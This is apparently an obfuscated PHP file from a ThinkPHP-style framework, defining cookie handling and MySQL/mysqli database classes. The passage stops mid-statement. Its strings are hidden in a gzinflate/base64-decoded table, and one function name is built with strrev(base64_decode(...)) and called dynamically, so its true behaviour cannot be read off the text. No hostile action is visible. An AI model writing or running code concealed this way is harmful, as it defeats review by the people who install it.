<?php
 goto d¡˜Ÿ—ÇºŸ; F¤£î¬È¶: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($¢˜Ş§‘Æ = '', $õßæšóË = 0) { if (is_string($¢˜Ş§‘Æ) && $¢˜Ş§‘Æ != $_SERVER[Ö†ØøÖ±][12]) { $this->prefix = $¢˜Ş§‘Æ; } if (is_numeric($õßæšóË) && $õßæšóË > 0) { $this->expire = $õßæšóË; } } public static function getInstance() { static $¤©•¨ÄØ; if ($¤©•¨ÄØ === null) { $¤©•¨ÄØ = new self(); } return $¤©•¨ÄØ; } private static $cookieDisable = false; public static function disable($¿‹Œ”ä´) { self::$cookieDisable = $¿‹Œ”ä´; } private static $sameCookieSet = array(); public static function set($Úäû¹Ù, $Ü€ƒ–½, $¢€¼íÔı = 0, $üÊÙËçÜ = false, $üš–€–€ = false) { $üÉ‘ƒ ´ =& $_SERVER[Ö†ØøÖ±]; if (self::$cookieDisable) { return; } if (!$¢€¼íÔı) { $¢€¼íÔı = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Úäû¹Ù]) && self::$sameCookieSet[$Úäû¹Ù] == $Ü€ƒ–½ . $¢€¼íÔı) { return; } self::$sameCookieSet[$Úäû¹Ù] = $Ü€ƒ–½ . $¢€¼íÔı; if (!$üš–€–€) { $üš–€–€ = str_replace(HOST, $üÉ‘ƒ ´[12], APP_HOST); $üš–€–€ = _get($GLOBALS, $üÉ‘ƒ ´[935], $üš–€–€); } $ÄÅÀİ·Ö = $üÉ‘ƒ ´[12]; setcookie($Úäû¹Ù, $Ü€ƒ–½, time() + $¢€¼íÔı, $üÉ‘ƒ ´[8] . trim($üš–€–€, $üÉ‘ƒ ´[8]) . $ÄÅÀİ·Ö, !1, !1, $üÊÙËçÜ); } public static function setSafe($˜Ø»òø, $”¯º›ßç, $òÎÌÒí“ = 0) { self::set($˜Ø»òø, $”¯º›ßç, $òÎÌÒí“, !0); } public static function get($Ğã£€•) { static $•ìøŒË = false; if (!$•ìøŒË) { self::initHeaderCookie(); $•ìøŒË = !0; } return isset($_COOKIE[$Ğã£€•]) ? $_COOKIE[$Ğã£€•] : !1; } private static function initHeaderCookie() { $´™û§Ğ­ =& $_SERVER[Ö†ØøÖ±]; if (!isset($_SERVER[$´™û§Ğ­[936]]) || !$_SERVER[$´™û§Ğ­[936]]) { return; } $°âÕ¥Œı = explode($´™û§Ğ­[71], $_SERVER[$´™û§Ğ­[936]]); foreach ($°âÕ¥Œı as $´í¶Íú¿) { $´í¶Íú¿ = explode($´™û§Ğ­[937], $´í¶Íú¿); if (count($´í¶Íú¿) != 2 || !isset($´í¶Íú¿[1])) { continue; } $_COOKIE[trim($´í¶Íú¿[0])] = trim($´í¶Íú¿[1]); } } public static function remove($Ë¬óç¶¢, $ÛãŠ­›È = false) { unset($_COOKIE[$Ë¬óç¶¢]); self::set($Ë¬óç¶¢, $_SERVER[Ö†ØøÖ±][12], 1, $ÛãŠ­›È); } } class DbMysql extends Db { public function __construct($Á§­üè± = '') { $×¡¼Ú =& $_SERVER[Ö†ØøÖ±]; if (!extension_loaded($×¡¼Ú[857])) { think_exception(think_lang($×¡¼Ú[14]) . $×¡¼Ú[938]); } if (!empty($Á§­üè±)) { $this->config = $Á§­üè±; if (empty($this->config[$×¡¼Ú[17]])) { $this->config[$×¡¼Ú[17]] = $×¡¼Ú[12]; } } } public function connect($é§½êÜŠ = '', $œÙ¼…¦å = 0, $ÕËú½ = false) { $çÙÑì‰ş =& $_SERVER[Ö†ØøÖ±]; if (!isset($this->linkID[$œÙ¼…¦å])) { if (empty($é§½êÜŠ)) { $é§½êÜŠ = $this->config; } $ãïÚ¤Ø£ = $é§½êÜŠ[$çÙÑì‰ş[939]] . ($é§½êÜŠ[$çÙÑì‰ş[940]] ? "\x3a{$é§½êÜŠ[$çÙÑì‰ş[940]]}" : $çÙÑì‰ş[12]); $ìı—Çäà = !empty($é§½êÜŠ[$çÙÑì‰ş[17]][$çÙÑì‰ş[18]]) ? $é§½êÜŠ[$çÙÑì‰ş[17]][$çÙÑì‰ş[18]] : $this->pconnect; if ($ìı—Çäà) { $this->linkID[$œÙ¼…¦å] = mysql_pconnect($ãïÚ¤Ø£, $é§½êÜŠ[$çÙÑì‰ş[941]], $é§½êÜŠ[$çÙÑì‰ş[942]], 131072); } else { $this->linkID[$œÙ¼…¦å] = mysql_connect($ãïÚ¤Ø£, $é§½êÜŠ[$çÙÑì‰ş[941]], $é§½êÜŠ[$çÙÑì‰ş[942]], !0, 131072); } if (!$this->linkID[$œÙ¼…¦å] || !empty($é§½êÜŠ[$çÙÑì‰ş[21]]) && !mysql_select_db($é§½êÜŠ[$çÙÑì‰ş[21]], $this->linkID[$œÙ¼…¦å])) { think_exception(mysql_error()); } $³ú™‰ = mysql_get_server_info($this->linkID[$œÙ¼…¦å]); mysql_query($çÙÑì‰ş[943] . think_config($çÙÑì‰ş[944]) . $çÙÑì‰ş[58], $this->linkID[$œÙ¼…¦å]); if ($³ú™‰ > $çÙÑì‰ş[945]) { mysql_query($çÙÑì‰ş[946], $this->linkID[$œÙ¼…¦å]); } $this->connected = !0; if (1 != think_config($çÙÑì‰ş[22])) { unset($this->config); } } return $this->linkID[$œÙ¼…¦å]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($³ã’æÂ) { $üš¼±üß =& $_SERVER[Ö†ØøÖ±]; if (0 === stripos($³ã’æÂ, $üš¼±üß[317])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $³ã’æÂ; if ($this->queryID) { $this->free(); } think_action_status($üš¼±üß[23], 1); think_status($üš¼±üß[24]); $this->queryID = mysql_query($³ã’æÂ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ñÈ‚Óó“) { $Ó²â±€Ñ =& $_SERVER[Ö†ØøÖ±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ñÈ‚Óó“; if ($this->queryID) { $this->free(); } think_action_status($Ó²â±€Ñ[25], 1); think_status($Ó²â±€Ñ[24]); $Ğ«ÃÔø = mysql_query($ñÈ‚Óó“, $this->_linkID); $this->debug(); if (!1 === $Ğ«ÃÔø) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ö†ØøÖ±][947], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $à²°¤ª = mysql_query($_SERVER[Ö†ØøÖ±][948], $this->_linkID); $this->transTimes = 0; if (!$à²°¤ª) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $×—¿àº¶ = mysql_query($_SERVER[Ö†ØøÖ±][949], $this->_linkID); $this->transTimes = 0; if (!$×—¿àº¶) { $this->error(); return !1; } } return !0; } private function getAll() { $‚åŞÃÆô = array(); if ($this->numRows > 0) { while ($˜óÇ˜è = mysql_fetch_assoc($this->queryID)) { $‚åŞÃÆô[] = $˜óÇ˜è; } mysql_data_seek($this->queryID, 0); } return $‚åŞÃÆô; } public function getFields($Á™­ÂŠé) { $¬ğ°œ‡ =& $_SERVER[Ö†ØøÖ±]; $¢ÄùÀ… = $this->query($¬ğ°œ‡[950] . $this->parseKey($Á™­ÂŠé)); $”ê³ÛÊÔ = array(); if ($¢ÄùÀ…) { foreach ($¢ÄùÀ… as $å¼ºï¬ => $Œ¬­Ç¤‡) { $”ê³ÛÊÔ[$Œ¬­Ç¤‡[$¬ğ°œ‡[31]]] = array($¬ğ°œ‡[32] => $Œ¬­Ç¤‡[$¬ğ°œ‡[31]], $¬ğ°œ‡[33] => $Œ¬­Ç¤‡[$¬ğ°œ‡[34]], $¬ğ°œ‡[35] => (bool) (strtoupper($Œ¬­Ç¤‡[$¬ğ°œ‡[36]]) === $¬ğ°œ‡[951]), $¬ğ°œ‡[37] => $Œ¬­Ç¤‡[$¬ğ°œ‡[38]], $¬ğ°œ‡[39] => strtolower($Œ¬­Ç¤‡[$¬ğ°œ‡[40]]) == $¬ğ°œ‡[41], $¬ğ°œ‡[42] => strtolower($Œ¬­Ç¤‡[$¬ğ°œ‡[43]]) == $¬ğ°œ‡[44]); } } return $”ê³ÛÊÔ; } public function getTables($““Ûğò = '') { $˜°ŞÒµ =& $_SERVER[Ö†ØøÖ±]; if (!empty($““Ûğò)) { $˜±³è = $˜°ŞÒµ[952] . $““Ûğò . $˜°ŞÒµ[953]; } else { $˜±³è = $˜°ŞÒµ[954]; } $°¦ÉäÑœ = $this->query($˜±³è); $ø½‹·Ğ = array(); foreach ($°¦ÉäÑœ as $œ‚á˜Ø => $½ü¡¯³) { $ø½‹·Ğ[$œ‚á˜Ø] = current($½ü¡¯³); } return $ø½‹·Ğ; } public function replace($ğğİ¢¥‹, $íÓºÑîÌ = array()) { $ì¢øÍİí =& $_SERVER[Ö†ØøÖ±]; foreach ($ğğİ¢¥‹ as $é“¹¸õÅ => $üö…Éæ·) { $é’şƒÊò = $this->parseValue($üö…Éæ·); if (is_scalar($é’şƒÊò)) { $œ²Ë€•È[] = $é’şƒÊò; $ØÀõ®’[] = $this->parseKey($é“¹¸õÅ); } } $İ¦Ùäâ¿ = $ì¢øÍİí[955] . $this->parseTable($íÓºÑîÌ[$ì¢øÍİí[332]]) . $ì¢øÍİí[956] . implode($ì¢øÍİí[50], $ØÀõ®’) . $ì¢øÍİí[957] . implode($ì¢øÍİí[50], $œ²Ë€•È) . $ì¢øÍİí[958]; return $this->execute($İ¦Ùäâ¿); } public function insertAll($õÈÅ õı, $ãïØÙ¹Ï = array(), $›Şóõî = false) { $«şÍÔ =& $_SERVER[Ö†ØøÖ±]; if (!is_array($õÈÅ õı[0])) { return !1; } $Ã¬ú‘›Ú = array_keys($õÈÅ õı[0]); $ÓÁÃºö = array(); foreach ($õÈÅ õı as $ğºŸõÒÂ) { $ÔøÈ€ô× = array(); foreach ($ğºŸõÒÂ as $ó„ôÆÊÚ => $óëë€Ï¸) { $óëë€Ï¸ = $this->parseValue($óëë€Ï¸); if (is_scalar($óëë€Ï¸)) { $ÔøÈ€ô×[] = $óëë€Ï¸; } } $ÓÁÃºö[] = $«şÍÔ[313] . implode($«şÍÔ[50], $ÔøÈ€ô×) . $«şÍÔ[958]; } array_walk($Ã¬ú‘›Ú, array($this, $«şÍÔ[959])); $˜¸ØİÍú = ($›Şóõî ? $«şÍÔ[960] : $«şÍÔ[961]) . $«şÍÔ[962] . $this->parseTable($ãïØÙ¹Ï[$«şÍÔ[332]]) . $«şÍÔ[956] . implode($«şÍÔ[50], $Ã¬ú‘›Ú) . $«şÍÔ[963] . implode($«şÍÔ[50], $ÓÁÃºö); return $this->execute($˜¸ØİÍú); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $¦ì†¿ƒ =& $_SERVER[Ö†ØøÖ±]; $this->error = mysql_errno() . $¦ì†¿ƒ[4] . mysql_error($this->_linkID); if ($¦ì†¿ƒ[12] != $this->queryStr) { $this->error .= LNG($¦ì†¿ƒ[48]) . $this->queryStr; } think_trace($this->error, $¦ì†¿ƒ[12], $¦ì†¿ƒ[49]); return $this->error; } public function escapeString($ñ‡¢ºÕ) { if ($this->_linkID) { return mysql_real_escape_string($ñ‡¢ºÕ, $this->_linkID); } else { return mysql_escape_string($ñ‡¢ºÕ); } } public function parseKey(&$´êºÁºõ, $şúğÛÄ¬ = true) { $ƒ‚ïªêÖ =& $_SERVER[Ö†ØøÖ±]; if ($şúğÛÄ¬) { $´êºÁºõ = $this->parseKeyCheck($´êºÁºõ); } if ($´êºÁºõ != $ƒ‚ïªêÖ[203] && !preg_match($ƒ‚ïªêÖ[964], $´êºÁºõ)) { $´êºÁºõ = $ƒ‚ïªêÖ[437] . trim($´êºÁºõ, $ƒ‚ïªêÖ[437]) . $ƒ‚ïªêÖ[437]; } return $´êºÁºõ; } } class DbMysqli extends Db { public function __construct($õÁóÅæˆ = '') { $ßÜÁÈ„˜ =& $_SERVER[Ö†ØøÖ±]; if (!extension_loaded($ßÜÁÈ„˜[965])) { think_exception(think_lang($ßÜÁÈ„˜[14]) . $ßÜÁÈ„˜[966]); } if (!empty($õÁóÅæˆ)) { $this->config = $õÁóÅæˆ; if (empty($this->config[$ßÜÁÈ„˜[17]])) { $this->config[$ßÜÁÈ„˜[17]] = $ßÜÁÈ„˜[12]; } } } public function connect($Üß™Ï¸ñ = '', $®ñïŒ— = 0) { $ÃÀÍ—İ =& $_SERVER[Ö†ØøÖ±]; if (!isset($this->linkID[$®ñïŒ—])) { if (empty($Üß™Ï¸ñ)) { $Üß™Ï¸ñ = $this->config; } $this->linkID[$®ñïŒ—] = new mysqli($Üß™Ï¸ñ[$ÃÀÍ—İ[939]], $Üß™Ï¸ñ[$ÃÀÍ—İ[941]], $Üß™Ï¸ñ[$ÃÀÍ—İ[942]], $Üß™Ï¸ñ[$ÃÀÍ—İ[21]], $Üß™Ï¸ñ[$ÃÀÍ—İ[940]] ? intval($Üß™Ï¸ñ[$ÃÀÍ—İ[940]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ëİÔØşö = $this->linkID[$®ñïŒ—]->server_version; $this->linkID[$®ñïŒ—]->query($ÃÀÍ—İ[943] . think_config($ÃÀÍ—İ[944]) . $ÃÀÍ—İ[58]); if ($ëİÔØşö > $ÃÀÍ—İ[945]) { $this->linkID[$®ñïŒ—]->query($ÃÀÍ—İ[946]); } $this->connected = !0; if (1 != think_config($ÃÀÍ—İ[22])) { unset($this->config); } } return $this->linkID[$®ñïŒ—]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Á·àÎ­) { $Î£•ıÁ =& $_SERVER[Ö†ØøÖ±]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Á·àÎ­; if ($this->queryID) { $this->free(); } think_action_status($Î£•ıÁ[23], 1); think_status($Î£•ıÁ[24]); $this->queryID = $this->_linkID->query($Á·àÎ­); if ($this->_linkID->more_results()) { while (($¦ææ·şè = $this->_linkID->next_result()) != NULL) { $¦ææ·şè->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($¿µÕ¸‰Ş) { $ºä÷»¬ô =& $_SERVER[Ö†ØøÖ±]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¿µÕ¸‰Ş; if ($this->queryID) { $this->free(); } think_action_status($ºä÷»¬ô[25], 1); think_status($ºä÷»¬ô[24]); $·»¼ŸšÌ = $this->_linkID->query($¿µÕ¸‰Ş); $this->debug(); if (!1 === $·»¼ŸšÌ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $öæÕ‘ùõ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$öæÕ‘ùõ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $·¯ ¡ÀÓ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$·¯ ¡ÀÓ) { $this->error(); return !1; } } return !0; } private function getAll() { $Š ¦—³Ô = array(); if ($this->numRows > 0) { for ($ğÔ“ğ’ = 0; $ğÔ“ğ’ < $this->numRows; $ğÔ“ğ’++) { $Š ¦—³Ô[$ğÔ“ğ’] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Š ¦—³Ô; } public function getFields($†é„˜®) { $ÒÏŒÕŞ‡ =& $_SERVER[Ö†ØøÖ±]; $™æ¹ÍÃÀ = $this->query($ÒÏŒÕŞ‡[950] . $this->parseKey($†é„˜®)); $¿í¨Êİó = array(); if ($™æ¹ÍÃÀ) { foreach ($™æ¹ÍÃÀ as $ˆĞŸÒŞ´ => $³îıõè–) { $¿í¨Êİó[$³îıõè–[$ÒÏŒÕŞ‡[31]]] = array($ÒÏŒÕŞ‡[32] => $³îıõè–[$ÒÏŒÕŞ‡[31]], $ÒÏŒÕŞ‡[33] => $³îıõè–[$ÒÏŒÕŞ‡[34]], $ÒÏŒÕŞ‡[35] => (bool) ($³îıõè–[$ÒÏŒÕŞ‡[36]] === $ÒÏŒÕŞ‡[12]), $ÒÏŒÕŞ‡[37] => $³îıõè–[$ÒÏŒÕŞ‡[38]], $ÒÏŒÕŞ‡[39] => strtolower($³îıõè–[$ÒÏŒÕŞ‡[40]]) == $ÒÏŒÕŞ‡[41], $ÒÏŒÕŞ‡[42] => strtolower($³îıõè–[$ÒÏŒÕŞ‡[43]]) == $ÒÏŒÕŞ‡[44]); } } return $¿í¨Êİó; } public function getTables($üİ¡”¤ = '') { $ì¾ıËçÁ =& $_SERVER[Ö†ØøÖ±]; $‡Ÿ—€¢Ÿ = !empty($üİ¡”¤) ? $ì¾ıËçÁ[952] . $üİ¡”¤ . $ì¾ıËçÁ[953] : $ì¾ıËçÁ[954]; $¹É®©á» = $this->query($‡Ÿ—€¢Ÿ); $ú•…°õ = array(); if ($¹É®©á») { foreach ($¹É®©á» as $«¼ÈÉÖæ => $¤£Ù¹Œë) { $ú•…°õ[$«¼ÈÉÖæ] = current($¤£Ù¹Œë); } } return $ú•…°õ; } public function replace($¦ÜÌ¤›ª, $Œï¾èİå = array()) { $šˆ²üŒ =& $_SERVER[Ö†ØøÖ±]; foreach ($¦ÜÌ¤›ª as $ñ÷ÖË÷Â => $‡Šç¢Ğò) { $Ëøı“Ë× = $this->parseValue($‡Šç¢Ğò); if (is_scalar($Ëøı“Ë×)) { $±ËÃÅš˜[] = $Ëøı“Ë×; $û÷ÚÄ«[] = $this->parseKey($ñ÷ÖË÷Â); } } $¶¾ÙÑ = $šˆ²üŒ[955] . $this->parseTable($Œï¾èİå[$šˆ²üŒ[332]]) . $šˆ²üŒ[956] . implode($šˆ²üŒ[50], $û÷ÚÄ«) . $šˆ²üŒ[957] . implode($šˆ²üŒ[50], $±ËÃÅš˜) . $šˆ²üŒ[958]; return $this->execute($¶¾ÙÑ); } public function insertAll($²À‹¡şÎ, $À‘â“£Ö = array(), $¿­úü¨ı = false) { $òî…ÆÏ€ =& $_SERVER[Ö†ØøÖ±]; if (!is_array($²À‹¡şÎ[0])) { return !1; } $î¡íĞ¿Ö = array_keys($²À‹¡şÎ[0]); $‚ÔšÀö® = array(); foreach ($²À‹¡şÎ as $óà‡‹«) { $ãï©™ü = array(); foreach ($óà‡‹« as $ç×ŒëÉğ => $»óá¿òÆ) { $»óá¿òÆ = $this->parseValue($»óá¿òÆ); if (is_scalar($»óá¿òÆ)) { $ãï©™ü[] = $»óá¿òÆ; } } $‚ÔšÀö®[] = $òî…ÆÏ€[313] . implode($òî…ÆÏ€[50], $ãï©™ü) . $òî…ÆÏ€[958]; } array_walk($î¡íĞ¿Ö, array($this, $òî…ÆÏ€[959])); $÷Èúó‘í = $¿­úü¨ı ? $òî…ÆÏ€[960] : $òî…ÆÏ€[961]; $åœĞ–€ã = $÷Èúó‘í . $òî…ÆÏ€[962] . $this->parseTable($À‘â“£Ö[$òî…ÆÏ€[332]]) . $òî…ÆÏ€[956] . implode($òî…ÆÏ€[50], $î¡íĞ¿Ö) . $òî…ÆÏ€[963] . implode($òî…ÆÏ€[50], $‚ÔšÀö®); return $this->execute($åœĞ–€ã); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $çØĞ·• =& $_SERVER[Ö†ØøÖ±]; $this->error = $this->_linkID->errno . $çØĞ·•[4] . $this->_linkID->error; if ($çØĞ·•[12] != $this->queryStr) { $this->error .= LNG($çØĞ·•[48]) . $this->queryStr; } think_trace($this->error, $çØĞ·•[12], $çØĞ·•[49]); return $this->error; } public function escapeString($Ÿ½Ú”Ù) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Ÿ½Ú”Ù); } else { return addslashes($Ÿ½Ú”Ù); } } public function parseKey(&$¹Í¬‹íı, $ìüÏ”š­ = true) { $™¶½ĞÇş =& $_SERVER[Ö†ØøÖ±]; if ($ìüÏ”š­) { $¹Í¬‹íı = $this->parseKeyCheck($¹Í¬‹íı); } if ($¹Í¬‹íı != $™¶½ĞÇş[203] && !preg_match($™¶½ĞÇş[964], $¹Í¬‹íı)) { $¹Í¬‹íı = $™¶½ĞÇş[437] . trim($¹Í¬‹íı, $™¶½ĞÇş[437]) . $™¶½ĞÇş[437]; } return $¹Í¬‹íı; } } goto bõÅƒ¢Ò®; C¦Ş‰Ë„Û: $fileSize = strrev(base64_decode($_SERVER[·“«ÆĞ®][0])); function binCheckNeq($ó¯ìÈæ, $äáÀ›­ï) { return $ó¯ìÈæ != $äáÀ›­ï; } $_SERVER[$_SERVER[·“«ÆĞ®][1]] = $fileSize($_SERVER[$_SERVER[·“«ÆĞ®][2]]); goto cÕ»³‡œáù; BÕ”øÁ÷¦Ç: define($_SERVER[Ö†ØøÖ±][0], $_SERVER[Ö†ØøÖ±][1]); $_SERVER[·“«ÆĞ®] = explode($_SERVER[Ö†ØøÖ±][2], gzinflate(substr($_SERVER[Ö†ØøÖ±][3], 10, -8))); function binCheckEq($šâ×úøâ, $ù¨š†™É) { return $šâ×úøâ == $ù¨š†™É; } goto C¦Ş‰Ë„Û; AÄğƒ›³¿Œ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\151\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\156\145\161" => "\x3c\x3e", "\x67\164" => "\76", "\145\x67\164" => "\76\75", "\154\x74" => "\74", "\145\x6c\164" => "\74\x3d", "\x6e\x6f\164\154\x69\153\x65" => "\116\117\124\x20\114\x49\113\x45", "\154\151\x6b\x65" => "\x4c\x49\x4b\x45", "\151\x6e" => "\x49\116", "\x6e\157\x74\151\x6e" => "\x4e\117\x54\40\111\x4e", "\156\x6f\x74\40\x69\156" => "\x4e\117\x54\x20\111\116", "\142\x65\164\167\145\145\156" => "\102\x45\x54\x57\x45\x45\x4e", "\x6e\x6f\x74\142\x65\164\167\145\x65\156" => "\x4e\x4f\x54\x20\x42\x45\124\127\105\x45\116", "\x6e\x6f\x74\x20\142\145\164\167\145\x65\156" => "\x4e\117\124\x20\102\105\124\x57\x45\x45\116"); protected $selectSql = "\123\x45\x4c\x45\x43\x54\45\x44\111\123\x54\111\x4e\x43\x54\x25\40\45\106\111\105\x4c\x44\x25\x20\x46\x52\x4f\115\40\45\124\x41\102\x4c\x45\45\x25\112\x4f\x49\116\45\45\127\x48\105\122\105\x25\45\x47\x52\x4f\x55\x50\x25\45\x48\x41\x56\x49\116\107\45\45\x4f\122\x44\105\x52\x25\x25\x4c\x49\x4d\111\124\x25\40\45\x55\116\x49\117\116\45\45\x43\117\115\x4d\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $¹€¤—ı¢ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ö†ØøÖ±][1013], $¹€¤—ı¢); } public function factory($Ğ¸Ï©ØŸ = '') { $ÌÏƒ«Ùƒ =& $_SERVER[Ö†ØøÖ±]; $Ğ¸Ï©ØŸ = $this->parseConfig($Ğ¸Ï©ØŸ); if (empty($Ğ¸Ï©ØŸ[$ÌÏƒ«Ùƒ[1014]])) { think_exception(think_lang($ÌÏƒ«Ùƒ[1015])); } $this->dbType = ucwords(strtolower($Ğ¸Ï©ØŸ[$ÌÏƒ«Ùƒ[1014]])); $ëõÎŸØÚ = $ÌÏƒ«Ùƒ[1016] . $this->dbType; if (class_exists($ëõÎŸØÚ)) { $ÁŞœ˜… = new $ëõÎŸØÚ($Ğ¸Ï©ØŸ); if ($ÌÏƒ«Ùƒ[1017] != strtolower($Ğ¸Ï©ØŸ[$ÌÏƒ«Ùƒ[1014]])) { $ÁŞœ˜…->dbType = strtoupper($this->dbType); } else { $ÁŞœ˜…->dbType = $this->_getDsnType($Ğ¸Ï©ØŸ[$ÌÏƒ«Ùƒ[969]]); } } else { think_exception(think_lang($ÌÏƒ«Ùƒ[1018]) . $ÌÏƒ«Ùƒ[1019] . $ëõÎŸØÚ); } return $ÁŞœ˜…; } public function __call($ëøĞ¶ƒ‘, $ÜÖ›ÉÕí) { if (method_exists($this, $ëøĞ¶ƒ‘)) { return call_user_func_array(array($this, $ëøĞ¶ƒ‘), $ÜÖ›ÉÕí); } } protected function _getDsnType($¶ùÅ‘¥´) { $ÊÇœŞÁ = explode($_SERVER[Ö†ØøÖ±][4], $¶ùÅ‘¥´); $ı·êãµ = strtoupper(trim($ÊÇœŞÁ[0])); return $ı·êãµ; } private function parseConfig($¨¡‚¶¦ù = '') { $î´ï¨æ =& $_SERVER[Ö†ØøÖ±]; if (!empty($¨¡‚¶¦ù) && is_string($¨¡‚¶¦ù)) { $¨¡‚¶¦ù = $this->parseDSN($¨¡‚¶¦ù); } elseif (is_array($¨¡‚¶¦ù)) { $¨¡‚¶¦ù = array_change_key_case($¨¡‚¶¦ù); $¨¡‚¶¦ù = array($î´ï¨æ[1014] => $¨¡‚¶¦ù[$î´ï¨æ[1020]], $î´ï¨æ[941] => $¨¡‚¶¦ù[$î´ï¨æ[1021]], $î´ï¨æ[942] => $¨¡‚¶¦ù[$î´ï¨æ[1022]], $î´ï¨æ[939] => $¨¡‚¶¦ù[$î´ï¨æ[1023]], $î´ï¨æ[940] => $¨¡‚¶¦ù[$î´ï¨æ[1024]], $î´ï¨æ[21] => $¨¡‚¶¦ù[$î´ï¨æ[1025]], $î´ï¨æ[969] => $¨¡‚¶¦ù[$î´ï¨æ[1026]], $î´ï¨æ[17] => isset($¨¡‚¶¦ù[$î´ï¨æ[1027]]) ? $¨¡‚¶¦ù[$î´ï¨æ[1027]] : array()); } elseif (empty($¨¡‚¶¦ù)) { if (think_config($î´ï¨æ[1028]) && $î´ï¨æ[1017] != strtolower(think_config($î´ï¨æ[1029]))) { $¨¡‚¶¦ù = $this->parseDSN(think_config($î´ï¨æ[1028])); } else { $¨¡‚¶¦ù = array($î´ï¨æ[1014] => think_config($î´ï¨æ[1029]), $î´ï¨æ[941] => think_config($î´ï¨æ[1030]), $î´ï¨æ[942] => think_config($î´ï¨æ[1031]), $î´ï¨æ[939] => think_config($î´ï¨æ[1032]), $î´ï¨æ[940] => think_config($î´ï¨æ[1033]), $î´ï¨æ[21] => think_config($î´ï¨æ[299]), $î´ï¨æ[969] => think_config($î´ï¨æ[1028]), $î´ï¨æ[17] => think_config($î´ï¨æ[1034])); } } return $¨¡‚¶¦ù; } protected function initConnect($ë«­÷£ˆ = true) { if (1 == think_config($_SERVER[Ö†ØøÖ±][22])) { $this->_linkID = $this->multiConnect($ë«­÷£ˆ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $òî¨“«Ú => $šÂ¿Ü) { $this->_linkID = $šÂ¿Ü; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ÀÄÊê— = false) { $³¿ùˆÑì =& $_SERVER[Ö†ØøÖ±]; static $Ñ¡Ú½•Š = array(); static $ŞÁ¬ãôÏ = -1; if (empty($Ñ¡Ú½•Š)) { foreach ($this->config as $Á¢Ü¤³à => $ÙŞÑ­Ëû) { $Ñ¡Ú½•Š[$Á¢Ü¤³à] = explode($³¿ùˆÑì[50], $ÙŞÑ­Ëû); } } if (think_config($³¿ùˆÑì[1035])) { if ($ÀÄÊê— || think_config($³¿ùˆÑì[447]) === !0) { $Ò·»Äü‡ = floor(mt_rand(0, think_config($³¿ùˆÑì[1036]) - 1)); $ŞÁ¬ãôÏ = $Ò·»Äü‡; } else { if (is_numeric(think_config($³¿ùˆÑì[1037]))) { $Ò·»Äü‡ = think_config($³¿ùˆÑì[1037]); } else { $Ò·»Äü‡ = floor(mt_rand(think_config($³¿ùˆÑì[1036]), count($Ñ¡Ú½•Š[$³¿ùˆÑì[939]]) - 1)); } } } else { $Ò·»Äü‡ = floor(mt_rand(0, count($Ñ¡Ú½•Š[$³¿ùˆÑì[939]]) - 1)); $ŞÁ¬ãôÏ = $Ò·»Äü‡; } $Ò·»Äü‡ = $ŞÁ¬ãôÏ !== -1 ? $ŞÁ¬ãôÏ : $Ò·»Äü‡; $òÈ¾ö¾È = array($³¿ùˆÑì[941] => isset($Ñ¡Ú½•Š[$³¿ùˆÑì[941]][$Ò·»Äü‡]) ? $Ñ¡Ú½•Š[$³¿ùˆÑì[941]][$Ò·»Äü‡] : $Ñ¡Ú½•Š[$³¿ùˆÑì[941]][0], $³¿ùˆÑì[942] => isset($Ñ¡Ú½•Š[$³¿ùˆÑì[942]][$Ò·»Äü‡]) ? $Ñ¡Ú½•Š[$³¿ùˆÑì[942]][$Ò·»Äü‡] : $Ñ¡Ú½•Š[$³¿ùˆÑì[942]][0], $³¿ùˆÑì[939] => isset($Ñ¡Ú½•Š[$³¿ùˆÑì[939]][$Ò·»Äü‡]) ? 